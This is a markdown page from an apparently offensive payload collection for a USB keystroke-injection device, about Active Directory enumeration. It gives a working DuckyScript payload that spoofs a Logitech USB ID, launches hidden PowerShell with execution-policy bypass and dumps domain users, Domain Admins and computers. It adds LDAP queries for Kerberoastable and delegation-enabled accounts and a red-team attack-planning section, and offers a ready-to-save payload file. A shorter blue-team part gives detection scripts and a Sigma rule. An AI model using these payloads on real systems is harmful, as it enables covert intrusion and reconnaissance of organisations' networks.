# FZ-A08: Active Directory Enumeration

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-A08 |
| **Name** | Active Directory Enumeration |
| **Difficulty** | Advanced |
| **Target OS** | Windows (Domain-Joined) |
| **Requirements** | Domain-joined system |
| **MITRE ATT&CK** | T1087.002 (Domain Account Discovery) |

## What This Payload Does

Enumerates Active Directory objects including users, groups, computers, domain controllers, and trust relationships. This information is critical for lateral movement planning in enterprise environments.

---

## The Payload

```ducky
REM =============================================
REM ADVANCED: Active Directory Enumeration
REM Target: Domain-Joined Windows System
REM Action: Enumerates AD objects
REM Output: %TEMP%\ad_enum.txt
REM Skill: Advanced
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500

REM AD Enumeration
STRINGLN $ad = @()
STRINGLN $ad += "=== ACTIVE DIRECTORY ENUMERATION ==="
STRINGLN $ad += "Generated: $(Get-Date)"
STRINGLN $ad += ""

REM Current Domain Info
STRINGLN $ad += "=== CURRENT DOMAIN ==="
STRINGLN $ad += ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Out-String)

REM Domain Controllers
STRINGLN $ad += "=== DOMAIN CONTROLLERS ==="
STRINGLN $ad += ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | Select Name, IPAddress, OSVersion | Out-String)

REM Domain Users (first 100)
STRINGLN $ad += "=== DOMAIN USERS (Sample) ==="
STRINGLN $searcher = [adsisearcher]"(&(objectCategory=user))"
STRINGLN $searcher.PageSize = 100
STRINGLN $ad += ($searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname } | Select -First 100 | Out-String)

REM Domain Admins
STRINGLN $ad += "=== DOMAIN ADMINS ==="
STRINGLN $searcher = [adsisearcher]"(&(objectCategory=group)(cn=Domain Admins))"
STRINGLN $result = $searcher.FindOne()
STRINGLN $ad += ($result.Properties.member | Out-String)

REM Domain Computers
STRINGLN $ad += "=== DOMAIN COMPUTERS (Sample) ==="
STRINGLN $searcher = [adsisearcher]"(&(objectCategory=computer))"
STRINGLN $searcher.PageSize = 50
STRINGLN $ad += ($searcher.FindAll() | ForEach-Object { $_.Properties.name } | Select -First 50 | Out-String)

REM Save results
STRINGLN $ad | Out-File "$env:TEMP\ad_enum.txt"
STRINGLN exit
```

---

## AD Enumeration Techniques

### Using ADSI Searcher

```powershell
# Basic LDAP query
$searcher = [adsisearcher]"(&(objectCategory=user))"
$searcher.FindAll()

# Find specific user
$searcher = [adsisearcher]"(&(objectCategory=user)(samaccountname=admin))"
$searcher.FindOne()

# Find group members
$searcher = [adsisearcher]"(&(objectCategory=group)(cn=Domain Admins))"
$searcher.FindOne().Properties.member

# Find computers
$searcher = [adsisearcher]"(&(objectCategory=computer))"
$searcher.FindAll()

# Find disabled accounts
$searcher = [adsisearcher]"(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"
$searcher.FindAll()
```

### Using .NET Classes

```powershell
# Get current domain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Get current forest
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# Get domain controllers
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers

# Get trust relationships
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetAllTrustRelationships()
```

### Using ActiveDirectory Module (If Available)

```powershell
# Import module
Import-Module ActiveDirectory

# Get domain info
Get-ADDomain

# Get users
Get-ADUser -Filter * -Properties *

# Get groups
Get-ADGroup -Filter *

# Get computers
Get-ADComputer -Filter *

# Get domain admins
Get-ADGroupMember "Domain Admins"
```

---

## Key AD Objects to Enumerate

### High-Value Targets

| Object Type | Why Important |
|-------------|---------------|
| Domain Admins | Highest privilege |
| Enterprise Admins | Forest-wide admin |
| Schema Admins | AD schema modification |
| Account Operators | Can create/modify users |
| Backup Operators | Can backup DC |
| Domain Controllers | Critical infrastructure |
| Service Accounts | Often over-privileged |

### Enumeration Queries

```powershell
# Enterprise Admins
$searcher = [adsisearcher]"(&(objectCategory=group)(cn=Enterprise Admins))"

# Account Operators
$searcher = [adsisearcher]"(&(objectCategory=group)(cn=Account Operators))"

# Service Accounts
$searcher = [adsisearcher]"(&(objectCategory=user)(servicePrincipalName=*))"

# Computers with unconstrained delegation
$searcher = [adsisearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"

# Users with SPN (Kerberoastable)
$searcher = [adsisearcher]"(&(objectCategory=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

# Users with Password Never Expires
$searcher = [adsisearcher]"(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"
```

---

## Cross-Platform AD Enum

### Linux with ldapsearch

```bash
# Enumerate users
ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=com" "(objectClass=user)" samaccountname

# Enumerate groups
ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=com" "(objectClass=group)" cn

# With credentials
ldapsearch -x -H ldap://DC_IP -D "user@domain.com" -W -b "dc=domain,dc=com" "(objectClass=user)"
```

### Python with ldap3

```python
from ldap3 import Server, Connection, ALL

server = Server('ldap://DC_IP', get_info=ALL)
conn = Connection(server, user='user@domain.com', password='password')
conn.bind()

# Search for users
conn.search('dc=domain,dc=com', '(objectClass=user)', attributes=['sAMAccountName'])
for entry in conn.entries:
    print(entry.sAMAccountName)
```

### macOS

macOS can enumerate AD if joined:
```bash
# Using dscl
dscl /Search -list /Users
dscl /Search -list /Groups

# Using ldapsearch
ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=com" "(objectClass=user)"
```

---

## Red Team Perspective

### Key Information to Gather

| Data | Purpose |
|------|---------|
| Domain Admins | Target accounts |
| DC list | Attack targets |
| Trusts | Lateral movement paths |
| SPNs | Kerberoasting targets |
| Old accounts | Easy targets |
| Password policy | Attack planning |

### Attack Planning Data

```powershell
# Password policy
$searcher = [adsisearcher]""
$searcher.SearchRoot = [ADSI]"LDAP://DC=domain,DC=com"
$policy = $searcher.FindOne()
$policy.Properties["minPwdLength"]
$policy.Properties["lockoutThreshold"]
$policy.Properties["lockoutDuration"]
```

### Attack Chain

```
Domain Join Detection → AD Enumeration → Target Selection → Attack Execution
                              ↑
                          You are here
```

---

## Blue Team Perspective

### Detection Opportunities

1. **LDAP Queries**
   - High volume LDAP queries
   - Queries for sensitive groups
   - Queries from unusual hosts

2. **Event Logging**
   - Event ID 4662 (Object access)
   - Event ID 4624 (Logon events)

3. **Network Traffic**
   - LDAP traffic patterns
   - Kerberos ticket requests

### Detection Script

```powershell
# Monitor for AD enumeration
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    Id=4662
} -MaxEvents 500 | Where-Object {
    $_.Message -match 'Domain Admins|Enterprise Admins|Schema Admins'
}

# Check PowerShell for LDAP queries
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    Id=4104
} -MaxEvents 300 | Where-Object {
    $_.Message -match 'adsisearcher|LDAP:|DirectorySearcher|Get-ADUser|Get-ADGroup'
}
```

### Sigma Rule

```yaml
title: Active Directory Enumeration
status: experimental
description: Detects AD enumeration via PowerShell
logsource:
    product: windows
    category: ps_script
detection:
    selection:
        ScriptBlockText|contains:
            - 'adsisearcher'
            - 'DirectorySearcher'
            - 'Get-ADUser'
            - 'Get-ADGroup'
            - 'Get-ADComputer'
            - 'Domain Admins'
            - 'Enterprise Admins'
    condition: selection
level: medium
tags:
    - attack.discovery
    - attack.t1087.002
```

### Prevention

1. **Least Privilege**
   - Restrict AD read permissions
   - Tiered admin model

2. **Monitoring**
   - LDAP query logging
   - Honeypot accounts

3. **Network Segmentation**
   - Limit DC access
   - Admin networks

---

## Practice Exercises

### Exercise 1: Check Domain Membership
```powershell
(Get-WmiObject Win32_ComputerSystem).PartOfDomain
```

### Exercise 2: Get Domain Name
```powershell
$env:USERDNSDOMAIN
```

### Exercise 3: Find Domain Controller
```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers[0].Name
```

---

## Payload File

Save as `FZ-A08_AD_Enumeration.txt`:

```ducky
REM FZ-A08: AD Enumeration
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500
STRINGLN $o=@();$o+=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()|Out-String;$s=[adsisearcher]"(&(objectCategory=group)(cn=Domain Admins))";$o+=$s.FindOne().Properties.member|Out-String;$o|Out-File "$env:TEMP\ad.txt";exit
```

---

[← FZ-A07 Screenshot Capture](FZ-A07_Screenshot_Capture.md) | [Back to Advanced](README.md) | [Next: FZ-A09 Complete Attack Chain →](FZ-A09_Complete_Attack_Chain.md)
